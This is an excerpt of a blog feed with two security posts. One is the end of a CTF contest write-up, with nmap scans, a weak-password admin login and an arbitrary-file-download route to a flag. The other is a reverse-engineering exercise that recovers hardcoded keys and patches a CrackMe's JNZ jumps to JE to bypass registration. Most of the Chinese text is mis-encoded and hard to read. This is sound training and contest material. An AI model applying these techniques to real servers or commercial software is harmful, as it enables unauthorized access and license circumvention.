   32780/udp   mountd|   100005  1,2,3      32780/udp6  mountd|   100021  1,3,4      32777/tcp   nlockmgr|   100021  1,3,4      32777/tcp6  nlockmgr|   100021  1,3,4      32777/udp   nlockmgr|   100021  1,3,4      32777/udp6  nlockmgr|   100024  1          32778/tcp   status|   100024  1          32778/tcp6  status|   100024  1          32778/udp   status|_  100024  1          32778/udp6  status2049/tcp  open  nfs        3-4 (RPC #100003)7681/tcp  open  unknown| fingerprint-strings: |   GetRequest, HTTPOptions, RTSPRequest: |     HTTP/1.0 200 OK|     server: ttyd/1.6.3 (libwebsockets/4.2.1-09e6c20)|     content-type: text/html|     content-length: 464459|_    &lt;!DOCTYPE html>&lt;html lang="en">&lt;head>&lt;meta charset="UTF-8">&lt;meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">&lt;title>ttyd - Terminal&lt;/title>&lt;link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAcCAYAAAAAwr0iAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA0xpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDY3IDc5LjE1Nzc0NywgMjAxNS8wMy8zMC0yMzo0MDo0MiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vb8620/tcp  open  unknown| fingerprint-strings: |   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, Help, Kerberos, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie: |     HTTP/1.1 200 WebSocket|     Server: workerman/4.0.27|_    &lt;div style="text-align:center">&lt;h1>WebSocket&lt;/h1>&lt;hr>workerman/4.0.27&lt;/div>32777/tcp open  nlockmgr   1-4 (RPC #100021)32778/tcp open  status     1 (RPC #100024)32780/tcp open  mountd     1-3 (RPC #100005)44514/tcp open  http       Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16)|_http-title: \xE4\xBA\x91\xE6\x94\xAF\xE4\xBB\x98 - \xE4\xB8\x93\xE6\xB3\xA8\xE5\x85\x8D\xE7\xAD\xBE\xE7\xBA\xA6\xE8\xAE\xA9\xE6\x94\xAF\xE4\xBB\x98\xE5\xAF\xB9\xE6\x8E\xA5\xE6\x9B\xB4\xE7\xAE\x80\xE5\x8D\x95\xEF\xBC\x81| http-methods: |_  Potentially risky methods: TRACE|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/5.4.16<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7681ç«¯å£æ˜¯ä¸ªç»ˆç«¯ï¼Œåº”è¯¥æ˜¯ä¸»åŠæ–¹ç”¨æ¥ç®¡ç†å®¹å™¨çš„</p><p>å°è¯•çˆ†ç ´å¼±å¯†ç å¤±è´¥</p><h2 id="æœ¬åº”æˆåŠŸçš„åå°å¼±å¯†ç ç™»å½•ï¼ˆğŸ˜¡ï¼‰"><a href="#æœ¬åº”æˆåŠŸçš„åå°å¼±å¯†ç ç™»å½•ï¼ˆğŸ˜¡ï¼‰" class="headerlink" title="æœ¬åº”æˆåŠŸçš„åå°å¼±å¯†ç ç™»å½•ï¼ˆğŸ˜¡ï¼‰"></a>æœ¬åº”æˆåŠŸçš„åå°å¼±å¯†ç ç™»å½•ï¼ˆğŸ˜¡ï¼‰</h2><p>ç„¶åå‘¢ï¼Œç„¶åå°è¯•æ‹¿ä¸‹é¢çš„è”ç³»æ–¹å¼ä½œä¸ºå¯†ç ç™»å½•admin</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203152803529.png" alt="image-20241203152803529"></p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203152833405.png" alt="image-20241203152833405"></p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203152847462.png" alt="image-20241203152847462"></p><p>ï¼Ÿï¼Ÿï¼Ÿèµ›åçœ‹åˆ«äººçš„wpå’Œæˆ‘å½•å±çš„æ—¶å€™å‘ç°æ­£è§£å°±æ˜¯è¿™ä¸ªå•Š</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203160722494.png" alt="image-20241203160722494"></p><p>å”‰è‰å°ç­å­</p><p>åå°æ’ä»¶ä¸‹è½½è¿™é‡Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼ŒæŠŠflag.phpä¸‹ä¸‹æ¥å°±è¡Œï¼ˆæˆ‘è¯´adminä¸‹é¢æ”¾ä¸ªå‡ bçš„php.zipå¹²ä»€ä¹ˆï¼‰</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203162119216.png" alt="image-20241203162119216"></p><h2 id="æœªèƒ½æ‹¿åˆ°çš„å‰å°å•†æˆ·key"><a href="#æœªèƒ½æ‹¿åˆ°çš„å‰å°å•†æˆ·key" class="headerlink" title="æœªèƒ½æ‹¿åˆ°çš„å‰å°å•†æˆ·key"></a>æœªèƒ½æ‹¿åˆ°çš„å‰å°å•†æˆ·key</h2><p>è¿›å»çš„è¯å°±èƒ½æ‹¿åˆ°å•†æˆ·çš„key</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203161914233.png" alt="image-20241203161914233"></p><p>ç„¶åå»å‰å°ç™»å½•å•†æˆ·ï¼Œåœ¨å®˜æ–¹å…¬å‘Šå¤„å¾—åˆ°flag</p><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203161959514.png" alt="image-20241203161959514"></p><hr><h1 id="å®¢æœç³»ç»Ÿ-114-114-114-20"><a href="#å®¢æœç³»ç»Ÿ-114-114-114-20" class="headerlink" title="å®¢æœç³»ç»Ÿ-114.114.114.20"></a>å®¢æœç³»ç»Ÿ-114.114.114.20</h1><p>ä»äº‘æ”¯ä»˜å³è¾¹çš„å¼¹çª—è¿›å®¢æœç³»ç»Ÿ</p><p>å’Œè“å¸½æ¯å†³èµ›ä¸€æ ·çš„å®¢æœç³»ç»Ÿå•Šï¼Œè«éæ˜¯è“å¸½é­…åŠ›æ—¶åˆ»â€¦å¸ƒè±ªï¼Œå®¢æœä¸è¯»æˆ‘çš„xssï¼</p><p>æ¬§å†…è¯¥ï¼Œä¸è¯»xssçš„è¯ï¼Œç“¦å¡”è¥¿ï¼å®¢æœå¾ˆä¸é«˜å…´ä¸ºæˆ‘æœåŠ¡ğŸ˜¡</p><p>å®¢æœï¼š<a href="http://114.114.114.20:41451/welive.php?a=6168&group=1&url=aHR0cDovLzExNC4xMTQuMTE0LjIyOTo0NDUxNC8=">http://114.114.114.20:41451/welive.php?a=6168&amp;group=1&amp;url=aHR0cDovLzExNC4xMTQuMTE0LjIyOTo0NDUxNC8=</a></p><p>åå°ï¼š<a href="http://114.114.114.20:51451/">http://114.114.114.20:51451</a></p><h2 id="æ‰«æ-3"><a href="#æ‰«æ-3" class="headerlink" title="æ‰«æ"></a>æ‰«æ</h2><p><img src="/blog/2024/11/23/2024%E7%BD%91%E9%BC%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B/image-20241203163642001.png" alt="image-20241203163642001"></p><hr><h1 id="254-ç«¯å£æ‰«æ"><a href="#254-ç«¯å£æ‰«æ" class="headerlink" title="254 ç«¯å£æ‰«æ"></a>254 ç«¯å£æ‰«æ</h1><pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE    VERSION53&#x2F;tcp    open  tcpwrapped80&#x2F;tcp    open  http       nginx|_http-title: \xE6\xB2\xA1\xE6\x9C\x89\xE6\x89\xBE\xE5\x88\xB0\xE7\xAB\x99\xE7\x82\xB9111&#x2F;tcp   open  rpcbind    2-4 (RPC #100000)| rpcinfo: |   program version    port&#x2F;proto  service|   100000  2,3,4        111&#x2F;tcp   rpcbind|   100000  2,3,4        111&#x2F;udp   rpcbind|   100000  3,4          111&#x2F;tcp6  rpcbind|   100000  3,4          111&#x2F;udp6  rpcbind|   100003  3,4         2049&#x2F;tcp   nfs|   100003  3,4         2049&#x2F;tcp6  nfs|   100005  1,2,3      32780&#x2F;tcp   mountd|   100005  1,2,3      32780&#x2F;tcp6  mountd|   100005  1,2,3      32780&#x2F;udp   mountd|   100005  1,2,3      32780&#x2F;udp6  mountd|   100021  1,3,4      32777&#x2F;tcp   nlockmgr|   100021  1,3,4      32777&#x2F;tcp6  nlockmgr|   100021  1,3,4      32777&#x2F;udp   nlockmgr|   100021  1,3,4      32777&#x2F;udp6  nlockmgr|   100024  1          32778&#x2F;tcp   status|   100024  1          32778&#x2F;tcp6  status|   100024  1          32778&#x2F;udp   status|_  100024  1          32778&#x2F;udp6  status2049&#x2F;tcp  open  nfs        3-4 (RPC #100003)32777&#x2F;tcp open  nlockmgr   1-4 (RPC #100021)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;è°å·èµ°äº†æˆ‘çš„äº‘æ”¯ä»˜é¦–é¡µæ‰‹æœºå·å¼±å¯†ç ç™»å½•ï¼&lt;/p&gt;
&lt;p&gt;ctfæ²¡æœ‰webï¼Œ&lt;del&gt;æ¸—é€è¿˜å¯„äº†&lt;/del&gt;ï¼Œå¯æƒœé˜Ÿå‹å®‰å…¨è¿è¥ä¸€ä¸ªç¬¬3ä¸€ä¸ªç¬¬8äº†ï¼Œé—æ†¾é€€åœº&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;a href=&quot;https://blog.csdn.net/qq_30817059/article/details/144030914#t5&quot;&gt;https://blog.csdn.net/qq_30817059/article/details/144030914#t5&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="çº¿ä¸‹èµ›" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
  </entry>
  
  <entry>
    <title>è½¯ä»¶APPé€†å‘</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/</id>
    <published>2024-11-14T04:25:14.000Z</published>
    <updated>2024-12-12T04:44:50.029Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æŸé€†å‘å®è®­è®°å½•</p><span id="more"></span><hr><h1 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h1><p>PEiDï¼šä¸€æ¬¾è‘—åçš„æŸ¥å£³å·¥å…·ï¼Œå…¶åŠŸèƒ½å¼ºå¤§ï¼Œå‡ ä¹å¯ä»¥ä¾¦æµ‹å‡ºæ‰€æœ‰çš„å£³ï¼Œå…¶æ•°é‡å·²è¶…è¿‡470ç§PEæ–‡æ¡£çš„<a href="https://baike.baidu.com/item/%E5%8A%A0%E5%A3%B3/146523">åŠ å£³</a>ç±»å‹å’Œç­¾åã€‚å†…ç½®æœ‰å·®é”™æ§åˆ¶çš„æŠ€æœ¯ï¼Œæ‰€ä»¥ä¸€èˆ¬èƒ½ç¡®ä¿æ‰«æç»“æœçš„å‡†ç¡®æ€§ã€‚å‰ä¸¤ç§æ‰«ææ¨¡å¼å‡ ä¹åœ¨ç¬é—´å°±å¯å¾—åˆ°ç»“æœï¼Œæ ¸å¿ƒæ‰«æè¾ƒæ…¢</p><p>ILspyï¼šä¸€ä¸ªå¼€æºçš„ .net åç¼–è¯‘è½¯ä»¶ï¼Œä½¿ç”¨ååˆ†æ–¹ä¾¿ã€‚æ”¯æŒC#å’Œvbï¼šå¯ä»¥å°†ä¸€ä¸ª .dll æ–‡ä»¶è½¬æ¢ä¸ºC#æˆ–VBè¯­è¨€ã€‚æ”¯æŒä¿å­˜æ–‡ä»¶ï¼šå¯¹äºå•ä¸ªæ–‡ä»¶å¯ä»¥ä¿å­˜ä¸º .cs æ–‡ä»¶æˆ– .vb æ–‡ä»¶ï¼Œå½“æ–‡ä»¶è¾ƒå¤šæ—¶ï¼Œå¯ä»¥é€‰æ‹©ä¿å­˜ä¸ºé¡¹ç›®æ–‡ä»¶ã€‚æ”¯æŒC#çš„åç¼–è¯‘ï¼šC#è¯­å¥å¯è¢«åç¼–è¯‘å‡ºæ¥ï¼Œå¹¶å¯æ”¯æŒyield return è¯­å¥å’Œ lambda è¡¨è¾¾å¼çš„åç¼–è¯‘ã€‚</p><p>OllyDbgï¼šä¸€ç§å…·æœ‰å¯è§†åŒ–ç•Œé¢çš„32ä½æ±‡ç¼–åˆ†æè°ƒè¯•å™¨ï¼Œæ˜¯ä¸€ä¸ªæ–°çš„åŠ¨æ€è¿½è¸ªå·¥å…·ï¼Œå°† IDA ä¸ SoftICE ç»“åˆèµ·æ¥çš„æ€æƒ³ï¼ŒRing3çº§è°ƒè¯•å™¨ï¼Œéå¸¸å®¹æ˜“ä¸Šæ‰‹ï¼Œå·²ä»£æ›¿SoftICEæˆä¸ºå½“ä»Šæœ€ä¸ºæµè¡Œçš„è°ƒè¯•è§£å¯†å·¥å…·äº†ã€‚åŒæ—¶è¿˜æ”¯æŒæ’ä»¶æ‰©å±•åŠŸèƒ½ï¼Œæ˜¯ç›®å‰æœ€å¼ºå¤§çš„è°ƒè¯•å·¥å…·ã€‚ä¸­æ–‡ç‰ˆç•Œé¢æ¸…æ™°ï¼Œæ˜“äºæ“ä½œã€‚</p><hr><h1 id="0ï¼šä¸€æ¬¡ç®€å•çš„ç¨‹åºé€†å‘"><a href="#0ï¼šä¸€æ¬¡ç®€å•çš„ç¨‹åºé€†å‘" class="headerlink" title="0ï¼šä¸€æ¬¡ç®€å•çš„ç¨‹åºé€†å‘"></a>0ï¼šä¸€æ¬¡ç®€å•çš„ç¨‹åºé€†å‘</h1><h2 id="ç›®çš„"><a href="#ç›®çš„" class="headerlink" title="ç›®çš„"></a>ç›®çš„</h2><p>é€šè¿‡é€†å‘åˆ†æå°ç¨‹åºï¼Œå¤ç°å°ç¨‹åºçš„æºä»£ç ä»è€Œç ´è§£å°ç¨‹åº</p><h2 id="å†…å®¹"><a href="#å†…å®¹" class="headerlink" title="å†…å®¹"></a>å†…å®¹</h2><ol><li>æŸ¥å£³</li><li>åç¼–è¯‘</li><li>å¤ç°æºä»£ç </li><li>æŸ¥çœ‹æ­£ç¡®çš„é€šå…³å¯†é’¥</li></ol><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><ol><li><p>å…ˆè¿è¡Œç¨‹åºï¼Œçœ‹çœ‹ç¨‹åºçš„æœ¬è´¨æ˜¯ä»€ä¹ˆï¼Œå¹²ä»€ä¹ˆ</p></li><li><p>PEiD çœ‹ç¨‹åºæ˜¯ä»€ä¹ˆç±»å‹ï¼Œè¾¨åˆ«æ˜¯ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼Œç„¶åé€‰æ‹©åˆé€‚çš„å·¥å…·åˆ†æ</p></li><li><p>é€šè¿‡ PEiD è¾¨åˆ«å‡ºæ˜¯ä»€ä¹ˆè¯­è¨€ç¼–å†™çš„ï¼Œå°±å¯ä»¥è¿ç”¨ç›¸åº”çš„å·¥å…·å»åˆ†æï¼›æ¯”å¦‚ dotnet å¯ä»¥ä½¿ç”¨ ILSpyï¼Œc&#x2F;c++ï¼Œwin åˆ†æå’Œ IDApro é™æ€åˆ†æï¼Œæ ¹æ®ç¨‹åºçš„å¤æ‚åº¦é€‰æ‹©åˆé€‚çš„å·¥å…·åˆ†æ</p></li><li><p>é€šè¿‡å…³é”®å­—å¿«é€Ÿå¯»æ‰¾flag</p></li><li><p>ç¨‹åºæ–­ç‚¹åŠ¨æ€åˆ†ææˆ–è€…é™æ€åˆ†æç®—æ³•æœ€ç»ˆå®Œæˆé€†å‘å¾—åˆ°flag</p></li></ol><h2 id="æ­¥éª¤"><a href="#æ­¥éª¤" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>ä¸‹è½½æ‰€éœ€ç ´è§£çš„å°ç¨‹åºï¼ˆè¿™é‡Œä»¥ aldé˜¿æ‹‰ä¸ç¥ç¯ ä¸ºä¾‹ï¼‰ï¼Œæµ‹è¯•é€šå…³å¯†è¯­</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114123336268.png" alt="image-20241114123336268"></p></li><li><p>åˆ©ç”¨æŸ¥å£³å·¥å…·æŸ¥çœ‹aldçš„ç¼–è¯‘è¯­è¨€ï¼ˆPEiDï¼‰ï¼š</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114123513990.png" alt="image-20241114123513990"></p><p>å¯ä»¥çœ‹åˆ°æ˜¯ C# ç¼–è¯‘çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨ iLSpy æ¥æŸ¥çœ‹æºä»£ç </p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114124047136.png" alt="image-20241114124047136"></p><p>è§‚å¯Ÿæºç ç»“æ„ï¼Œä»åˆšæ‰æµ‹è¯• ald ç¨‹åºçš„è¿‡ç¨‹ä¸­å¯çŸ¥å½“æˆ‘ä»¬æŒ‰ä¸‹æŒ‰é’®æ—¶ä¼šåˆ¤æ–­å¯†è¯­æ­£ç¡®ä¸å¦</p><p>é‚£ä¹ˆå…ˆæŸ¥çœ‹ä¸Šé¢çš„ Button1_Click æºç </p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114124414678.png" alt="image-20241114124414678"></p><p>è¿™é‡Œä¸æ˜æ–‡å¯†è¯­æ¯”è¾ƒè¿›è¡Œåˆ¤æ–­ï¼Œé‚£ä¹ˆå¯çŸ¥å¯†è¯­ä¸ºï¼šzhimakaimen@2011</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114124529946.png" alt="image-20241114124529946"></p></li></ol><hr><h1 id="1ï¼šè½¯ä»¶ç ´è§£å…¥é—¨-æš´åŠ›ç ´è§£CrackMe"><a href="#1ï¼šè½¯ä»¶ç ´è§£å…¥é—¨-æš´åŠ›ç ´è§£CrackMe" class="headerlink" title="1ï¼šè½¯ä»¶ç ´è§£å…¥é—¨(æš´åŠ›ç ´è§£CrackMe)"></a>1ï¼šè½¯ä»¶ç ´è§£å…¥é—¨(æš´åŠ›ç ´è§£CrackMe)</h1><h2 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p>æ‰€è°“æš´åŠ›ç ´è§£ï¼Œå°±æ˜¯é€šè¿‡ä¿®æ”¹æ±‡ç¼–ä»£ç è¿›è€Œæ§åˆ¶ç¨‹åºçš„è¿è¡Œæµç¨‹ï¼Œè¾¾åˆ°ä¸éœ€æ³¨å†Œç ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨è½¯ä»¶çš„ç›®çš„</p><h2 id="æ­¥éª¤-1"><a href="#æ­¥éª¤-1" class="headerlink" title="æ­¥éª¤"></a>æ­¥éª¤</h2><ol><li><p>ä»¥ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹ä¸­çš„CFF CrackMe #3ç¨‹åºä¸ºä¾‹</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114141119248.png" alt="image-20241114141119248"></p><p>æ˜¯ä¸€ä¸ªæ³¨å†Œæœº</p></li><li><p>æŸ¥å£³</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114135130256.png" alt="image-20241114135130256"></p><p>ç”¨ Delphi å†™çš„ï¼Œæ— å£³</p></li><li><p>OllyDbg è½½å…¥æ­¤ç¨‹åºï¼Œä½¿ç”¨çš„æ˜¯W32Dasmï¼Œå±äºé™æ€åæ±‡ç¼–è½¯ä»¶ï¼Œæ”¯æŒWIN APIï¼Œå…·æœ‰å¼ºå¤§çš„ä¸²å¼å‚è€ƒåŠŸèƒ½</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114135658544.png" alt="image-20241114135658544"></p><p>åœ¨åæ±‡ç¼–çª—å£ â€œå³é”®â€”â€”æŸ¥æ‰¾â€”â€”æ‰€æœ‰å‚è€ƒæ–‡æœ¬å­—ç¬¦ä¸²â€</p><p>å†å³é”®æŸ¥æ‰¾æ–‡æœ¬</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114140735055.png" alt="image-20241114140735055"></p><p>è¿™é‡ŒæŸ¥æ‰¾æ•´ä¸ªèŒƒå›´ä¸‹çš„ Wrong å­—ç¬¦ä¸²</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114141216323.png" alt="image-20241114141216323"></p></li></ol><p>æ‰¾åˆ° Wrong Serial,try again! ï¼Œå³é”®â€”â€”åæ±‡ç¼–çª—å£ä¸­è·Ÿéš</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114142801639.png" alt="image-20241114142801639"></p><p>åˆ†æç¨‹åºæµç¨‹ï¼š</p><p>è¾“å…¥IDå’Œæ³¨å†Œç åï¼Œ</p><p>00440F34 å¤„çš„ call è°ƒç”¨å­å‡½æ•°æ¥åˆ¤æ–­IDæ˜¯å¦ä¸º Registered Userï¼ˆ00440F34å¤„ï¼Œcall 00403B2Cå¤„çš„å­å‡½æ•°ï¼‰</p><p>å¦‚æœä¸æ­£ç¡®ï¼Œä¸€ä¸ª jnz è·³åˆ° 00440F8Cï¼Œå¼¹å‡º &quot;Wrong Serial, try again!&quot;</p><p>00440F51 å¤„çš„ call è°ƒç”¨å­å‡½æ•°æ¥åˆ¤æ–­æ³¨å†Œç æ˜¯å¦ä¸º GFX-754-IER-954ï¼ˆ00440F51å¤„ï¼Œcall 00403B2Cå¤„çš„å­å‡½æ•°ï¼‰</p><p>å¦‚æœä¸æ­£ç¡®ï¼Œä¸€ä¸ª jnz è·³åˆ° 00440F72 ï¼Œå¼¹å‡º &quot;Wrong Serial, try again!&quot;</p><p>æ‰€ä»¥æ­£ç¡®çš„IDå’Œæ³¨å†Œç æ˜¯è¿™é‡Œç¡¬ç¼–ç çš„Registered User : GFX-754-IER-954</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114153726506.png" alt="image-20241114153726506"></p><br><p>ä¸è¿‡æˆ‘ä»¬è¿™é‡Œè¦å­¦ä¹ çš„æ˜¯æš´åŠ›ç ´è§£</p><p>ç°åœ¨åœ¨ä»»æ„ä¸€ä¸ª call 00403B2C å‰é¢ f2 ä¸‹ä¸ªæ–­ç‚¹ï¼Œçœ‹çœ‹ call äº†ä¸ªä»€ä¹ˆå‡½æ•°ï¼Œè¿™é‡Œé€‰æ‹©åœ¨éªŒè¯ id çš„éƒ¨åˆ†ä¸‹æ–­ç‚¹</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114143724315.png" alt="image-20241114143724315"></p><p>f9 è°ƒè¯•ç¨‹åºï¼Œéšä¾¿è¾“å…¥ä¸€ä¸ªé”™è¯¯çš„idï¼štest å’Œé”™è¯¯çš„æ³¨å†Œç ï¼š123-456-789ï¼ŒæŒ‰ä¸‹æ³¨å†Œ</p><p>è·Ÿè¿›ï¼Œç›´åˆ° 00440F34 çš„ call æŒ‡ä»¤ï¼Œf7 å•æ­¥æ­¥å…¥æ£€éªŒå‡½æ•°ï¼ˆæ­¤å‡½æ•°åœ°å€åœ¨ 00403B2Cï¼‰</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114154222304.png" alt="image-20241114154222304"></p><p>å¯ä»¥è§‚å¯Ÿåˆ° eax å­˜å‚¨äº†æˆ‘ä»¬çš„ idï¼Œedx å­˜å‚¨äº†æ­£ç¡®çš„ id</p><p>åœ¨ 00403B33 ä¼šè¿›è¡Œ cmp æ¯”è¾ƒ</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114145541524.png" alt="image-20241114145541524"></p><p>ä»ä»£ç ä¸­å¯ä»¥å‘ç°ï¼Œç¨‹åºå°†è¾“å…¥çš„æ³¨å†Œç ä¸å†…ç½®çš„æ³¨å†Œç ç”¨cmpæŒ‡ä»¤åšäº†æ¯”è¾ƒã€‚ï¼ˆcmp æŒ‡ä»¤æ‰§è¡Œåï¼Œå°†å¯¹æ ‡å¿—å¯„å­˜å™¨ ZF äº§ç”Ÿå½±å“ã€‚æ¯”å¦‚ CMP AX , BX ï¼Œå½“AX&#x3D;BXæ—¶ï¼ŒZF&#x3D;1ï¼›AX!&#x3D;BXæ—¶ï¼ŒZF&#x3D;0ã€‚ï¼‰</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæ³¨å†Œç ä¸è¾“å…¥çš„å­—ç¬¦ä¸²ä¸ç›¸ç­‰ï¼ŒZF&#x3D;0ã€‚æ­¤æ—¶å­ç¨‹åºè¿”å›ï¼Œæ‰§è¡Œ 00440F39 å¤„çš„ JNZ æŒ‡ä»¤ã€‚å› ä¸ºè¾“å…¥çš„æ³¨å†Œç ä¸å¯¹ï¼ŒZF&#x3D;0ï¼Œå¼€å§‹æ‰§è¡Œ JNZï¼Œè·³è½¬åˆ° 00440F8Cï¼Œå¼¹å‡º Wrong Serial å¯¹è¯æ¡†æç¤ºæ³¨å†Œç é”™è¯¯ã€‚</p><p>è¿™å°±æ˜¯â€œå…³é”®è·³â€ï¼Œå¦‚æœå°† JNZï¼ˆZF&#x3D;0æ—¶å°±è·³è½¬ï¼‰æ”¹ä¸º JEï¼ˆZF&#x3D;1æ—¶å°±è·³è½¬ï¼‰ï¼Œå¾—åˆ°çš„ç»“æœå°±ä¼šæ­£å¥½ç›¸åï¼Œå³é”™è¯¯çš„æ³¨å†Œç åè€Œä¼šæç¤ºæ³¨å†ŒæˆåŠŸï¼Œå¯¹çš„æ³¨å†Œç åè€Œä¼šæç¤ºé”™è¯¯</p><p>é‚£ä¹ˆç°åœ¨æ‰¾å‡ºé‚£ä¸¤ä¸ªâ€œå…³é”®è·³â€ï¼ˆè¾“å…¥IDæ—¶calläº†ä¸€ä¸‹ï¼Œç„¶åä¸€ä¸ªjnzã€‚è¾“å…¥æ³¨å†Œç æ—¶åˆcalläº†ä¸€ä¸‹ï¼Œå†ä¸€ä¸ªjnzã€‚ï¼‰ï¼Œ</p><p><img src="/blog/2024/11/14/%E8%BD%AF%E4%BB%B6APP%E9%80%86%E5%90%91/image-20241114150533633.png" alt="image-20241114150533633"></p><p>æ¥ä¸‹æ¥ä¿®æ”¹æ±‡ç¼–ä»£ç ï¼ŒåŒå‡»å¯¹åº”çš„ JNZ æŒ‡ä»¤ï¼Œå¼¹å‡ºâ€œæ±‡ç¼–äºæ­¤å¤„â€çš„å¯¹è¯æ¡†ã€‚å°†åªéœ€å°† jnz æ”¹ä¸º je ï¼Œç‚¹å‡»â€œæ±‡ç¼–â€å³å¯ã€‚ç”¨åŒæ 